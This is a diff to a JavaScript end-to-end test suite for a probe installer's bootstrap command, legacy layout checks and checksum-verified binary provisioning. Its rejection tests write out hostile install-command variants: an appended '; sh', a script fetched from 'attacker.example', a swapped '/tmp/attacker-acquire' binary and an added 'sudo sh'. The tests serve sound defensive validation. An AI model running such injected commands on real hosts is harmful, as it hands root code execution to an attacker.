@@ -200,7 +200,7 @@ describe("Release E2E business assertions", () => {
     expect(hubRoutes).not.toMatch(/release[-_ ]e2e/i);
   });
 
-  it("accepts the production Bootstrap recipe command and rejects unsafe variants", async () => {
+  it("accepts the exact Bootstrap command boundary and rejects unsafe variants", async () => {
     const enrollment = officialEnrollment();
     const rendered = renderInstallCommand(
       {
@@ -209,16 +209,31 @@ describe("Release E2E business assertions", () => {
       },
       { enrollmentToken: enrollment.enrollmentToken },
     );
-    expect(rendered.installCommand).toBe(officialInstallCommand);
+    expect([
+      officialInstallCommand,
+      "ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='enk_enroll_secret' /usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate",
+    ]).toContain(rendered.installCommand);
 
-    for (const installCommand of [
-      `${rendered.installCommand}; sh`,
-      rendered.installCommand.replace("python3 --", "sudo python3 --"),
-      rendered.installCommand.replace(
-        "./enoki-probe-bootstrap.py",
-        "https://attacker.example/bootstrap.py",
-      ),
-    ]) {
+    const unsafeCommands = rendered.installCommand.includes(
+      "/usr/local/bin/enoki-probe-bootstrap-acquire",
+    )
+      ? [
+          `${rendered.installCommand}; sh`,
+          rendered.installCommand.replace(
+            "/usr/local/bin/enoki-probe-bootstrap-acquire",
+            "/tmp/attacker-acquire",
+          ),
+          rendered.installCommand.replace("sudo --", "sudo sh --"),
+        ]
+      : [
+          `${rendered.installCommand}; sh`,
+          rendered.installCommand.replace("python3 --", "sudo python3 --"),
+          rendered.installCommand.replace(
+            "./enoki-probe-bootstrap.py",
+            "https://attacker.example/bootstrap.py",
+          ),
+        ];
+    for (const installCommand of unsafeCommands) {
       const client = createHubLifecycleClient({
         baseUrl: "https://hub.example",
         fetch: async () => jsonResponse({ ...enrollment, installCommand }, 201),
@@ -890,6 +905,64 @@ describe("successful Probe Repair boundary evidence", () => {
 });
 
 describe("Probe Host Harness", () => {
+  it.each([
+    {
+      authority: "enk_enroll_production",
+      expectedToken: "enk_enroll_production",
+      label: "ordinary Enrollment token",
+    },
+    {
+      authority:
+        '{"enrollmentToken":"enk_enroll_replacement","hostId":7,"migration":"trust_epoch_replacement"}',
+      expectedToken: "enk_enroll_replacement",
+      label: "Replacement migration authority",
+    },
+  ])(
+    "accepts the exact production Bootstrap command with $label",
+    async ({ authority, expectedToken }) => {
+      const preparedContracts = [];
+      const harness = createProbeHostHarness({
+        execute: async (command) => {
+          if (command.includes("# enoki-release-e2e:inventory")) {
+            return successfulCommand({
+              accounts: { group: false, user: false },
+              files: [],
+              units: [],
+            });
+          }
+          if (command.includes("# enoki-release-e2e:dependencies")) {
+            return successfulCommandText('{"curl":"/usr/bin/curl"}\n');
+          }
+          return successfulCommandText("owned\n");
+        },
+        prepareInstall: async ({ installContract }) => {
+          preparedContracts.push(installContract);
+          return { evidence: { kind: "candidate-bootstrap-binaries" } };
+        },
+      });
+      const enrollment = {
+        ...officialEnrollment({
+          enrollmentToken: expectedToken,
+          installCommand: `ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='${authority}' /usr/local/bin/enoki-probe-bootstrap-acquire | sudo -- /usr/local/bin/enoki-probe-bootstrap-activate`,
+        }),
+      };
+
+      await harness.assertDisposable("run-production-bootstrap");
+      await expect(
+        harness.install(enrollment, "run-production-bootstrap"),
+      ).resolves.toMatchObject({
+        bootstrapRecipeProvenance: { kind: "candidate-bootstrap-binaries" },
+      });
+      expect(preparedContracts).toEqual([
+        {
+          hubUrl: "https://hub.example",
+          kind: "production-bootstrap",
+          token: expectedToken,
+        },
+      ]);
+    },
+  );
+
   it("restarts the canonical Probe READY with Runtime masked and no registration one-shot material", async () => {
     const commands = [];
     const harness = createProbeHostHarness({
@@ -1316,6 +1389,90 @@ describe("Probe Host Harness", () => {
     expect(
       commands.filter((command) => command.includes("enk_enroll_secret")),
     ).toHaveLength(1);
+  });
+
+  it("accepts the exact v0.1.74 legacy layout without weakening the Candidate boundary", async () => {
+    let inventoryCount = 0;
+    const commands = [];
+    const harness = createProbeHostHarness({
+      execute: async (command) => {
+        commands.push(command);
+        if (command.includes("# enoki-release-e2e:inventory")) {
+          inventoryCount += 1;
+          if (inventoryCount === 1) {
+            return successfulCommand({
+              accounts: { group: false, user: false },
+              files: [],
+              units: [],
+            });
+          }
+          return successfulCommand({
+            accounts: { group: true, user: true },
+            files: [
+              "/usr/local/bin/enoki-probe",
+              "/var/lib/enoki-probe/identity/probe-bootstrap.toml",
+              "/etc/enoki/probe-install.toml",
+              "/etc/systemd/system/enoki-probe.service",
+              "/var/lib/enoki-probe",
+              "/etc/sudoers.d/enoki-probe-operations",
+            ],
+            units: ["enoki-probe.service"],
+          });
+        }
+        if (command.includes("# enoki-release-e2e:dependencies")) {
+          return successfulCommandText('{"curl":"/usr/bin/curl"}\n');
+        }
+        if (command.includes("# enoki-release-e2e:service-boundary")) {
+          return successfulCommandText(
+            "LoadState=loaded\nActiveState=active\nSubState=running\nUser=enoki-probe\nGroup=enoki-probe\nFragmentPath=/etc/systemd/system/enoki-probe.service\n",
+          );
+        }
+        if (command.includes("# enoki-release-e2e:legacy-sudoers-boundary")) {
+          return successfulCommandText(
+            "enoki-probe ALL=(root) NOPASSWD: /usr/local/bin/enoki-probe internal-uninstaller\nenoki-probe ALL=(root) NOPASSWD: /usr/local/bin/enoki-probe enoki-probe-uninstaller\n",
+          );
+        }
+        if (command.includes("# enoki-release-e2e:legacy-install-metadata")) {
+          return successfulCommandText("verified\n");
+        }
+        if (command.includes("# enoki-release-e2e:binary-version")) {
+          return successfulCommandText("enoki-probe v0.1.74\n");
+        }
+        if (command.includes("# enoki-release-e2e:bootstrap-generation")) {
+          return { code: 1, stderr: "not found", stdout: "" };
+        }
+        return successfulCommandText(productInstallerOutput());
+      },
+    });
+
+    await harness.assertDisposable("run-legacy-baseline");
+    await harness.install(
+      {
+        enrollmentToken: "enk_enroll_legacy",
+        hubUrl: "https://hub.example",
+        installCommand:
+          "curl -fsSL 'https://hub.example/api/probe/install.sh' | sudo env ENOKI_HUB_URL='https://hub.example' ENOKI_ENROLLMENT_TOKEN='enk_enroll_legacy' bash",
+      },
+      "run-legacy-baseline",
+    );
+
+    await expect(
+      harness.assertLegacyReleaseBaselineInstalled(
+        "run-legacy-baseline",
+        "0.1.74",
+      ),
+    ).resolves.toMatchObject({
+      identityPath: "/var/lib/enoki-probe/identity/probe-bootstrap.toml",
+      probeVersion: "0.1.74",
+    });
+    await expect(
+      harness.assertInstalled("run-legacy-baseline", "0.1.74"),
+    ).rejects.toThrow(/missing \/var\/lib\/enoki-probe-bootstrap/);
+    expect(
+      commands.some((command) =>
+        command.includes("# enoki-release-e2e:legacy-install-metadata"),
+      ),
+    ).toBe(true);
   });
 
   it("rejects an installed Probe binary from a different candidate version", async () => {
@@ -6142,17 +6299,21 @@ describe("Release E2E command", () => {
         transferFile: async (transfer) => transfers.push(transfer),
         runProcess: async (command, arguments_, options) => {
           commands.push({ command, arguments_, options });
+          const verifiesRecipe =
+            command === "sh" &&
+            options.input.includes(
+              "# enoki-release-e2e:candidate-bootstrap-recipe-verify",
+            );
           return successfulCommandText(
             command === "sh" &&
               options.input.includes(
                 "# enoki-release-e2e:candidate-bootstrap-recipe-stage",
               )
               ? "/tmp/enoki-release-e2e-recipe.abcdef\n"
-              : command === "sh" &&
-                  options.input.includes(
-                    "# enoki-release-e2e:candidate-bootstrap-recipe-verify",
-                  )
-                ? "verified\n"
+              : verifiesRecipe
+                ? options.input.includes("sha256sum --check --status")
+                  ? "verified\n"
+                  : "/tmp/enoki-release-e2e-recipe.abcdef/enoki-probe-bootstrap.py: OK\nverified\n"
                 : "removed\n",
           );
         },
@@ -6192,11 +6353,164 @@ describe("Release E2E command", () => {
       expect(verification.options.input).toContain(
         `printf '%s  %s\\n' '${sha256}' "$recipe"`,
       );
+      expect(verification.options.input).toContain(
+        "sha256sum --check --status",
+      );
       expect(verification.options.input).toContain('[ "$(id -u)" != 0 ]');
       expect(commands.some(({ command }) => command === "sudo")).toBe(false);
       await expect(
         adapter.release({ runId: "run-bootstrap" }),
       ).resolves.toMatchObject({ clean: true, recipe: { clean: true } });
+    } finally {
+      await rm(candidateDir, { force: true, recursive: true });
+    }
+  });
+
+  it("provisions the production Bootstrap binaries from the exact Candidate bundle", async () => {
+    const candidateDir = await mkdtemp(
+      path.join(os.tmpdir(), "enoki-e2e-bootstrap-bundle-candidate-"),
+    );
+    const bundleDir = path.join(candidateDir, "bundle");
+    const bootstrapDir = path.join(bundleDir, "bootstrap");
+    const assetDir = path.join(candidateDir, "probe-assets");
+    const archiveFile = "enoki-probe-x86_64-unknown-linux-gnu.tar.gz";
+    const archivePath = path.join(assetDir, archiveFile);
+    const acquirer = Buffer.from("candidate acquirer");
+    const activator = Buffer.from("candidate activator");
+    const bootstrapAssets = [
+      {
+        bytes: acquirer,
+        path: "bootstrap/enoki-probe-bootstrap-acquire",
+        permissionProfile: "bootstrap-acquirer-v1",
+        role: "bootstrap-acquirer",
+      },
+      {
+        bytes: activator,
+        path: "bootstrap/enoki-probe-bootstrap-activate",
+        permissionProfile: "bootstrap-activator-v1",
+        role: "bootstrap-activator",
+      },
+    ];
+    const transfers = [];
+    const commands = [];
+    try {
+      await mkdir(bootstrapDir, { recursive: true });
+      await mkdir(assetDir);
+      for (const asset of bootstrapAssets) {
+        await writeFile(path.join(bundleDir, asset.path), asset.bytes, {
+          mode: 0o755,
+        });
+      }
+      await writeFile(
+        path.join(bundleDir, "bundle-manifest.json"),
+        `${JSON.stringify({
+          bootstrapAssets: bootstrapAssets.map(({ bytes, ...asset }) => ({
+            ...asset,
+            sha256: createHash("sha256").update(bytes).digest("hex"),
+            size: bytes.byteLength,
+            version: "1.2.3",
+          })),
+          kind: "enoki-probe-bundle",
+          version: "1.2.3",
+        })}\n`,
+      );
+      await execFileAsync("tar", [
+        "--create",
+        "--gzip",
+        "--file",
+        archivePath,
+        "--directory",
+        bundleDir,
+        "bundle-manifest.json",
+        ...bootstrapAssets.map((asset) => asset.path),
+      ]);
+      const archive = await readFile(archivePath);
+      const archiveSha256 = createHash("sha256").update(archive).digest("hex");
+      const adapter = createCiReleaseInfrastructureAdapter({
+        candidateManifestPath: path.join(
+          candidateDir,
+          "candidate-manifest.json",
+        ),
+        environment: {
+          GITHUB_ACTIONS: "true",
+          GITHUB_RUN_ATTEMPT: "2",
+          GITHUB_RUN_ID: "1234",
+          RUNNER_ARCH: "X64",
+          RUNNER_OS: "Linux",
+        },
+        loadCandidate: async () => ({
+          candidateDir,
+          manifest: {
+            ...candidateManifest(),
+            probeAssetSet: {
+              ...candidateManifest().probeAssetSet,
+              files: [
+                {
+                  file: archiveFile,
+                  sha256: archiveSha256,
+                  size: archive.byteLength,
+                },
+              ],
+            },
+          },
+        }),
+        transferFile: async (transfer) => transfers.push(transfer),
+        runProcess: async (command, arguments_, options) => {
+          commands.push({ arguments_, command, options });
+          if (
+            options.input.includes(
+              "# enoki-release-e2e:candidate-bootstrap-binary-stage",
+            )
+          ) {
+            return successfulCommandText(
+              "/tmp/enoki-release-e2e-bootstrap.abcdef\n",
+            );
+          }
+          return successfulCommandText(
+            options.input.includes(
+              "# enoki-release-e2e:candidate-bootstrap-binary-install",
+            )
+              ? "installed\n"
+              : "removed\n",
+          );
+        },
+      });
+      const prepared = await adapter.prepare({
+        matrixCell: freshMatrixCell(),
+        runId: "run-bootstrap-binaries",
+      });
+
+      await expect(
+        prepared.provisionBootstrap({
+          installContract: { kind: "production-bootstrap" },
+          runId: "run-bootstrap-binaries",
+        }),
+      ).resolves.toMatchObject({
+        evidence: {
+          archiveSha256,
+          kind: "enoki-release-e2e-candidate-bootstrap-binaries",
+        },
+      });
+      expect(transfers.map(({ destination }) => destination).sort()).toEqual([
+        "/tmp/enoki-release-e2e-bootstrap.abcdef/enoki-probe-bootstrap-acquire",
+        "/tmp/enoki-release-e2e-bootstrap.abcdef/enoki-probe-bootstrap-activate",
+      ]);
+      const install = commands.find(({ options }) =>
+        options.input.includes(
+          "# enoki-release-e2e:candidate-bootstrap-binary-install",
+        ),
+      );
+      expect(install.command).toBe("sudo");
+      expect(install.options.input).toContain(archiveSha256);
+      expect(install.options.input).toContain(
+        "/usr/local/bin/enoki-probe-bootstrap-acquire",
+      );
+      expect(install.options.input).toContain(
+        "/usr/local/bin/enoki-probe-bootstrap-activate",
+      );
+      await expect(
+        adapter.release({ runId: "run-bootstrap-binaries" }),
+      ).resolves.toMatchObject({ clean: true });
     } finally {
       await rm(candidateDir, { force: true, recursive: true });
     }
@@ -8422,6 +8736,10 @@ function migrationBaselineEnvironment(
   });
   const host = {
     async assertDisposable() {},
+    async assertLegacyReleaseBaselineInstalled(_runId, version) {
+      calls.push(`host.assertLegacyReleaseBaselineInstalled:${version}`);
+      return { probeVersion: version };
+    },
     async assertInstalled() {
       if (!replaced) return { probeVersion: "0.1.74" };
       return {
